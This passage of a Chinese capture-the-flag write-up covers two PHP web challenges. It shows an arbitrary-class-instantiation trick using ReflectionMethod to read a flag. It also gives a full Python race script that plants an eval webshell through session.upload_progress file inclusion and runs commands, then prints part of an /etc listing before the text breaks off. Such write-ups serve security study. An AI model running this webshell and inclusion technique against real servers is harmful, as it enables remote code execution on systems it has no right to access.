class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];  <span class="comment">//类名</span></span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];  <span class="comment">//第二个参数</span></span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];  <span class="comment">//第一个参数</span></span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];  <span class="comment">//调用类的方法</span></span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>利用getDocComment读取注释</p><p><img src="https://www.hualigs.cn/image/60a35a85152ab.jpg"></p><p>在ReflectionMethod类构造方法传入类名和方法名</p><p><img src="https://www.hualigs.cn/image/60a35a852cac1.jpg"></p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.70.0.162:24336&#x2F;index.php?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a35a843591b.jpg"></p><h1 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h1><p>扫描目录得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.70.0.162:24363&#x2F;you_can_seeeeeeee_me.php</span><br></pre></td></tr></table></figure><p>利用session.upload_progress进行文件包含</p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p><img src="https://www.hualigs.cn/image/60a35a859e0ae.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;var_dump(scandir(&#x27;/etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g&#x27;));&quot;</span>,<span class="string">&quot;cf&quot;</span>:<span class="string">&quot;../../../var/lib/php/sessions/cccdbabbhf/sess_&quot;</span>+sessid&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://124.70.0.162:24363&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://124.70.0.162:24363&#x27;</span>,data=data)</span><br><span class="line">        print(resp.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># if &#x27;passwd&#x27; in resp.text:</span></span><br><span class="line">        <span class="comment">#     print(resp.text)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment">#     event.clear()</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>得到etc目录下所有文件和目录，发现fecccibbdc目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">[0]&#x3D;&gt;                                 </span><br><span class="line">string(1) &quot;.&quot;                         </span><br><span class="line">[1]&#x3D;&gt;                                 </span><br><span class="line">string(2) &quot;..&quot;                        </span><br><span class="line">[2]&#x3D;&gt;                                 </span><br><span class="line">string(9) &quot;.pwd.lock&quot;                 </span><br><span class="line">[3]&#x3D;&gt;                                 </span><br><span class="line">string(3) &quot;X11&quot;                       </span><br><span class="line">[4]&#x3D;&gt;                                 </span><br><span class="line">string(12) &quot;adduser.conf&quot;             </span><br><span class="line">[5]&#x3D;&gt;                                 </span><br><span class="line">string(12) &quot;alternatives&quot;             </span><br><span class="line">[6]&#x3D;&gt;                                 </span><br><span class="line">string(7) &quot;apache2&quot;                   </span><br><span class="line">[7]&#x3D;&gt;                                 </span><br><span class="line">string(10) &quot;apparmor.d&quot;               </span><br><span class="line">[8]&#x3D;&gt;                                 </span><br><span class="line">string(3) &quot;apt&quot;                       </span><br><span class="line">[9]&#x3D;&gt;                                 </span><br><span class="line">string(11) &quot;bash.bashrc&quot;              </span><br><span class="line">[10]&#x3D;&gt;                                </span><br><span class="line">string(17) &quot;bash_completion.d&quot;        </span><br><span class="line">[11]&#x3D;&gt;                                </span><br><span class="line">string(22) &quot;bindresvport.blacklist&quot;   </span><br><span class="line">[12]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;binfmt.d&quot;                  </span><br><span class="line">[13]&#x3D;&gt;                                </span><br><span class="line">string(15) &quot;ca-certificates&quot;          </span><br><span class="line">[14]&#x3D;&gt;                                </span><br><span class="line">string(20) &quot;ca-certificates.conf&quot;     </span><br><span class="line">[15]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;cron.d&quot;                    </span><br><span class="line">[16]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;cron.daily&quot;               </span><br><span class="line">[17]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;cron.weekly&quot;              </span><br><span class="line">[18]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;dbus-1&quot;                    </span><br><span class="line">[19]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;debconf.conf&quot;             </span><br><span class="line">[20]&#x3D;&gt;                                </span><br><span class="line">string(14) &quot;debian_version&quot;           </span><br><span class="line">[21]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;default&quot;                   </span><br><span class="line">[22]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;deluser.conf&quot;             </span><br><span class="line">[23]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;dhcp&quot;                      </span><br><span class="line">[24]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;dpkg&quot;                      </span><br><span class="line">[25]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;environment&quot;              </span><br><span class="line">[26]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;fecccibbdc&quot;               </span><br><span class="line">[27]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;fstab&quot;                     </span><br><span class="line">[28]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;gai.conf&quot;                  </span><br><span class="line">[29]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;group&quot;                     </span><br><span class="line">[30]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;group-&quot;                    </span><br><span class="line">[31]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;gshadow&quot;                   </span><br><span class="line">[32]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;gshadow-&quot;                  </span><br><span class="line">[33]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;host.conf&quot;                 </span><br><span class="line">[34]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;hostname&quot;                  </span><br><span class="line">[35]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;hosts&quot;                     </span><br><span class="line">[36]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;init&quot;                      </span><br><span class="line">[37]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;init.d&quot;                    </span><br><span class="line">[38]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;inputrc&quot;                   </span><br><span class="line">[39]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;insserv&quot;                   </span><br><span class="line">[40]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;insserv.conf&quot;             </span><br><span class="line">[41]&#x3D;&gt;                                </span><br><span class="line">string(14) &quot;insserv.conf.d&quot;           </span><br><span class="line">[42]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;issue&quot;                     </span><br><span class="line">[43]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;issue.net&quot;                 </span><br><span class="line">[44]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;kernel&quot;                    </span><br><span class="line">[45]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;ld.so.cache&quot;              </span><br><span class="line">[46]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;ld.so.conf&quot;               </span><br><span class="line">[47]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;ld.so.conf.d&quot;             </span><br><span class="line">[48]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;ldap&quot;                      </span><br><span class="line">[49]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;legal&quot;                     </span><br><span class="line">[50]&#x3D;&gt;                                </span><br><span class="line">string(13) &quot;libaudit.conf&quot;            </span><br><span class="line">[51]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;locale.alias&quot;             </span><br><span class="line">[52]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;locale.gen&quot;               </span><br><span class="line">[53]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;localtime&quot;                 </span><br><span class="line">[54]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;logcheck&quot;                  </span><br><span class="line">[55]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;login.defs&quot;               </span><br><span class="line">[56]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;logrotate.d&quot;              </span><br><span class="line">[57]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;lsb-release&quot;              </span><br><span class="line">[58]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;machine-id&quot;               </span><br><span class="line">[59]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;magic&quot;                     </span><br><span class="line">[60]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;magic.mime&quot;               </span><br><span class="line">[61]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;mailcap&quot;                   </span><br><span class="line">[62]&#x3D;&gt;                                </span><br><span class="line">string(13) &quot;mailcap.order&quot;            </span><br><span class="line">[63]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;mime.types&quot;               </span><br><span class="line">[64]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;mke2fs.conf&quot;              </span><br><span class="line">[65]&#x3D;&gt;                                </span><br><span class="line">string(14) &quot;modules-load.d&quot;           </span><br><span class="line">[66]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;mtab&quot;                      </span><br><span class="line">[67]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;mysql&quot;                     </span><br><span class="line">[68]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;networks&quot;                  </span><br><span class="line">[69]&#x3D;&gt;                                </span><br><span class="line">string(13) &quot;nsswitch.conf&quot;            </span><br><span class="line">[70]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;opt&quot;                       </span><br><span class="line">[71]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;os-release&quot;               </span><br><span class="line">[72]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;pam.conf&quot;                  </span><br><span class="line">[73]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;pam.d&quot;                     </span><br><span class="line">[74]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;passwd&quot;                    </span><br><span class="line">[75]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;passwd-&quot;                   </span><br><span class="line">[76]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;perl&quot;                      </span><br><span class="line">[77]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;php&quot;                       </span><br><span class="line">[78]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;profile&quot;                   </span><br><span class="line">[79]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;profile.d&quot;                 </span><br><span class="line">[80]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;python3.8&quot;                 </span><br><span class="line">[81]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;rc.local&quot;                  </span><br><span class="line">[82]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc0.d&quot;                     </span><br><span class="line">[83]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc1.d&quot;                     </span><br><span class="line">[84]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc2.d&quot;                     </span><br><span class="line">[85]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc3.d&quot;                     </span><br><span class="line">[86]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc4.d&quot;                     </span><br><span class="line">[87]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc5.d&quot;                     </span><br><span class="line">[88]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc6.d&quot;                     </span><br><span class="line">[89]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rcS.d&quot;                     </span><br><span class="line">[90]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;resolv.conf&quot;              </span><br><span class="line">[91]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;rmt&quot;                       </span><br><span class="line">[92]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;securetty&quot;                 </span><br><span class="line">[93]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;security&quot;                  </span><br><span class="line">[94]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;selinux&quot;                   </span><br><span class="line">[95]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;shadow&quot;                    </span><br><span class="line">[96]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;shadow-&quot;                   </span><br><span class="line">[97]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;shells&quot;                    </span><br><span class="line">[98]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;skel&quot;                      </span><br><span class="line">[99]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;ssl&quot;                       </span><br><span class="line">[100]&#x3D;&gt;                               </span><br><span class="line">string(6) &quot;subgid&quot;                    </span><br><span class="line">[101]&#x3D;&gt;                               </span><br><span class="line">string(7) &quot;subgid-&quot;                   </span><br><span class="line">[102]&#x3D;&gt;                               </span><br><span class="line">string(6) &quot;subuid&quot;                    </span><br><span 